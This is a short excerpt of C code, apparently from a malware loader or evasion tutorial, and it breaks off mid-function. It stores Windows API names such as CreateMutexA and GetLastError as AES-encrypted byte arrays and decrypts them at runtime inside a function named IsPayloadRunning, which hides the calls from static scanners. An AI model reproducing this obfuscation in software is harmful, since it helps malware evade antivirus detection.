...
char k2[] = { 0x74, 0x19, 0x43, 0xa8, 0xb9, 0x61, 0xc0, 0xdb, 0xec, 0x90, 0x45, 0xfe, 0x5b, 0x36, 0x8c, 0x5b };
...
unsigned char sCreateMutexA[] = { 0xc5, 0x51, 0xa5, 0x8d, 0x1b, 0xdf, 0xd8, 0x60, 0x27, 0x3a, 0x89, 0xc8, 0xc3, 0xab, 0x7c, 0x9 };
unsigned char sGetLastError[] = { 0xeb, 0x1e, 0x97, 0x8a, 0xb0, 0xdb, 0xa6, 0x36, 0x52, 0xbf, 0x77, 0xba, 0xa1, 0x5b, 0x3, 0xe1 };
...
BOOL IsPayloadRunning(int method) {
	...
	AESDecrypt((char *) sCreateMutexA, sizeof(sCreateMutexA), k2, sizeof(k2));
	AESDecrypt((char *) sGetLastError, sizeof(sGetLastError), k2, sizeof(k2));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));
